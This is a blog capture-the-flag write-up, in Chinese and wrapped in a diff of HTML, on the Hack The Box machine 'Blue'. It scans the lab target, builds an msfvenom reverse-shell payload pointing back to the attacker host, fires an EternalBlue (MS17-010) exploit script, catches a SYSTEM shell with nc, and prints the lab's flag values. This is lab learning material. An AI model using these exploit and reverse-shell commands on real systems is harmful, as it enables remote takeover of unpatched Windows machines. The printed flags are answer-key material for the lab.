@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>HTB靶机 Blue WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="author-link" content="">
+<meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='OSCP, HTB' /><meta itemprop="name" content="HTB靶机 Blue WriteUp">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2022-03-28T17:55:48+08:00" />
+<meta itemprop="dateModified" content="2022-03-28T17:55:48+08:00" />
+<meta itemprop="wordCount" content="1656">
+<meta itemprop="keywords" content="OSCP,HTB," /><meta property="og:title" content="HTB靶机 Blue WriteUp" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-blue-writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-28T17:55:48+08:00" />
+<meta property="article:modified_time" content="2022-03-28T17:55:48+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB靶机 Blue WriteUp"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-blue-writeup/" /><link rel="prev" href="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-lame-writeup/" /><link rel="next" href="https://www.bthoughts.top/posts/mac%E4%B8%8Bandroid-app%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "HTB靶机 Blue WriteUp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/www.bthoughts.top\/posts\/htb%E9%9D%B6%E6%9C%BA-blue-writeup\/"
+    },"genre": "posts","keywords": "OSCP, HTB","wordcount":  1656 ,
+    "url": "https:\/\/www.bthoughts.top\/posts\/htb%E9%9D%B6%E6%9C%BA-blue-writeup\/","datePublished": "2022-03-28T17:55:48+08:00","dateModified": "2022-03-28T17:55:48+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tools/"
+                
+                
+              ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tools/"
+                  
+                  
+                ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>HTB靶机 Blue WriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
+          <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
+      <div class="post-meta-line"><span title=2022-03-28&#32;17:55:48><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-28">2022-03-28</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1656 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#blue-简介">Blue 简介</a></li>
+    <li><a href="#writeup">WriteUp</a></li>
+    <li><a href="#0scan">0.SCAN</a></li>
+    <li><a href="#1-ms17-010-利用">1. MS17-010 利用</a></li>
+    <li><a href="#他山之石">他山之石</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="blue-简介">Blue 简介</h2>
+<p><img loading="lazy" src="/resource/HTB%e9%9d%b6%e6%9c%ba-Blue-WriteUp.assets/640-20230220175612205.png" srcset="/resource/HTB%e9%9d%b6%e6%9c%ba-Blue-WriteUp.assets/640-20230220175612205.png, /resource/HTB%e9%9d%b6%e6%9c%ba-Blue-WriteUp.assets/640-20230220175612205.png 1.5x, /resource/HTB%e9%9d%b6%e6%9c%ba-Blue-WriteUp.assets/640-20230220175612205.png 2x" sizes="auto" data-title="图片" data-alt="图片" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>OS：Windows；			难度：Easy</p>
+<h2 id="writeup">WriteUp</h2>
+<p>连接HTB靶场：<code>sudo openvpn  xxxx.ovpn</code></p>
+<p>测试靶机连通性：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ ping -c <span class="m">4</span> 10.10.10.40
+</span></span><span class="line"><span class="cl"> PING 10.10.10.40 <span class="o">(</span>10.10.10.40<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"> <span class="m">64</span> bytes from 10.10.10.40: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">127</span> <span class="nv">time</span><span class="o">=</span><span class="m">238</span> ms
+</span></span><span class="line"><span class="cl"> <span class="m">64</span> bytes from 10.10.10.40: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">127</span> <span class="nv">time</span><span class="o">=</span><span class="m">237</span> ms
+</span></span><span class="line"><span class="cl"> <span class="m">64</span> bytes from 10.10.10.40: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">4</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">127</span> <span class="nv">time</span><span class="o">=</span><span class="m">240</span> ms
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> --- 10.10.10.40 ping statistics ---
+</span></span><span class="line"><span class="cl"> <span class="m">4</span> packets transmitted, <span class="m">3</span> received, 25% packet loss, <span class="nb">time</span> 3035ms
+</span></span><span class="line"><span class="cl"> rtt min/avg/max/mdev <span class="o">=</span> 237.404/238.524/240.313/1.277 ms
+</span></span></code></pre></div><p>有点延迟和丢包，扫描探测结果可能不准确，需要复核。</p>
+<h2 id="0scan">0.SCAN</h2>
+<p>masscan 扫描全端口+ nmap 扫描详细端口信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ sudo masscan -e tun0 -p- --max-rate <span class="m">500</span> 10.10.10.40
+</span></span><span class="line"><span class="cl"> Starting masscan 1.3.2 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2022-03-21 05:48:42 GMT
+</span></span><span class="line"><span class="cl"> Initiating SYN Stealth Scan
+</span></span><span class="line"><span class="cl"> Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> Discovered open port 49156/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 49152/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 49154/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 49155/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 445/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 49153/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 49157/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 135/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> Discovered open port 139/tcp on 10.10.10.40
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ sudo nmap -p135,139,445,49152-49157 -sSV 10.10.10.40 --script<span class="o">=</span>default,vuln 
+</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-21 14:04 HKT
+</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.40
+</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl"> 135/tcp   open msrpc       Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"> 139/tcp   open netbios-ssn Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl"> 445/tcp   open microsoft-ds Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> 49152/tcp open msrpc       Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"> 49153/tcp open msrpc       Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"> 49154/tcp open msrpc       Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"> 49155/tcp open msrpc       Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"> 49156/tcp open unknown
+</span></span><span class="line"><span class="cl"> 49157/tcp open msrpc       Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"> Service Info: Host: HARIS-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> Host script results:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   2.1:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_   Message signing enabled but not required
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb-vuln-ms17-010:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   VULNERABLE:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     State: VULNERABLE
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     IDs: CVE:CVE-2017-0143
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Risk factor: HIGH
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       servers <span class="o">(</span>ms17-010<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Disclosure date: 2017-03-14
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_     https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_clock-skew: mean: 4m02s, deviation: 6s, median: 3m58s
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb-vuln-ms10-054: <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb-security-mode:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_ message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb-os-discovery:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   OS: Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows <span class="m">7</span> Professional 6.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Computer name: haris-PC
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   NetBIOS computer name: HARIS-PC<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_ System time: 2022-03-21T06:09:59+00:00
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   date: 2022-03-21T06:09:58
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_ start_date: 2022-03-21T05:42:34
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"> Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 117.51 seconds
+</span></span></code></pre></div><p>发现 存在 smb  ms17-010（CVE-2017-0143），操作系统为：Windows 7 Professional 7601 Service Pack 1 ，计算机名: haris-PC</p>
+<p>非MSF</p>
+<h2 id="1-ms17-010-利用">1. MS17-010 利用</h2>
+<p>不用msf去攻击</p>
+<p>nmap 只有检测脚本，没有利用脚本，通过网络expdb、Github搜索利用工具。</p>
+<p>最后找了这个：https://github.com/3ndG4me/AutoBlue-MS17-010</p>
+<p>下载代码，并安装依赖，这里我使用了Pipenv创建了单独的环境。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> └─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/
+</span></span><span class="line"><span class="cl"> └─$ pip install -r requirements.txt
+</span></span></code></pre></div><p>制作利用代码，可以利用shellcode文件夹下的 shell_prep.sh 辅助生成。</p>
+<p>这里直接使用msfvenom进行生成，并加入shellcode混合</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/
+</span></span><span class="line"><span class="cl"> └─$ nasm -f bin eternalblue_kshellcode_x64.asm -o evilKernel.bin
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/shellcode<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span>10.10.14.2 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f raw -o evilReverse.bin
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class="line"><span class="cl"> No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl"> Payload size: <span class="m">460</span> bytes
+</span></span><span class="line"><span class="cl"> Saved as: evilReverse.bin
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/shellcode<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ cat evilKernel.bin evilReverse.bin &gt; evilPayload.bin
+</span></span></code></pre></div><p>依据Github 的Readme 命令帮助，输入目标ip，payload 和Groom连接数，执行利用脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python eternalblue_exploit7.py &lt;TARGET-IP&gt; &lt;PATH/TO/SHELLCODE/sc_all.bin&gt; &lt;Number of Groom Connections <span class="o">(</span>optional<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ python3 eternalblue_exploit7.py 10.10.10.40 shellcode/evilPayload.bin <span class="m">2</span>
+</span></span><span class="line"><span class="cl"> shellcode size: <span class="m">1232</span>
+</span></span><span class="line"><span class="cl"> numGroomConn: <span class="m">2</span>
+</span></span><span class="line"><span class="cl"> Target OS: Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span>
+</span></span><span class="line"><span class="cl"> SMB1 session setup allocate nonpaged pool success
+</span></span><span class="line"><span class="cl"> SMB1 session setup allocate nonpaged pool success
+</span></span><span class="line"><span class="cl"> good response status: INVALID_PARAMETER
+</span></span><span class="line"><span class="cl"> <span class="k">done</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ python3 eternalblue_exploit7.py 10.10.10.40 shellcode/evilPayload.bin <span class="m">24</span>
+</span></span><span class="line"><span class="cl"> shellcode size: <span class="m">1232</span>
+</span></span><span class="line"><span class="cl"> numGroomConn: <span class="m">24</span>
+</span></span><span class="line"><span class="cl"> Target OS: Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span>
+</span></span><span class="line"><span class="cl"> SMB1 session setup allocate nonpaged pool success
+</span></span><span class="line"><span class="cl"> SMB1 session setup allocate nonpaged pool success
+</span></span><span class="line"><span class="cl"> good response status: INVALID_PARAMETER
+</span></span><span class="line"><span class="cl"> <span class="k">done</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></div><p>这里 <code>&lt;Number of Groom Connections (optional)&gt;</code>虽然是可选项，但经过多次不成功后，我按照参考文献2进行设置，同样在多次尝试后，成功获得shell，且为System权限。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> └─$ nc -nlvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"> listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl"> connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.40<span class="o">]</span> <span class="m">49159</span>
+</span></span><span class="line"><span class="cl"> Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+</span></span><span class="line"><span class="cl"> whoami
+</span></span><span class="line"><span class="cl"> nt authority<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl"> C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl"> <span class="nb">cd</span> C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop&gt;type user.txt
+</span></span><span class="line"><span class="cl"> <span class="nb">type</span> user.txt
+</span></span><span class="line"><span class="cl"> 6349f910cd5b7ddae73521237f8e90c3
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+</span></span><span class="line"><span class="cl"> <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+</span></span><span class="line"><span class="cl"> 3515d002af86dbfff3ce6f9bbffe7ede
+</span></span></code></pre></div><p>利用他人的工具，最后做出来了，但让我意识到对漏洞的一知半解，在攻击过程中会消耗大量的时间，甚至走上弯路。平时需要加强对漏洞的研究，了解漏洞的相关影响因素。</p>
+<p>MSF: 略</p>
+<h2 id="他山之石">他山之石</h2>
+<ul>
+<li>
+<p>Hack The Box - Blue (Without Metasploit)</p>
+</li>
+<li>
+<ul>
+<li>用了superscan</li>
+<li>用了其他exp，python2脚本</li>
+</ul>
+</li>
+<li>
+<p>Hack The Box - Blue Walkthrough without Metasploit</p>
+</li>
+<li>
+<ul>
+<li>使用了同一种方法，numGroomConn 需要尝试多次</li>
+</ul>
+</li>
+<li>
+<p>WriteUp: HackTheBox Blue</p>
+</li>
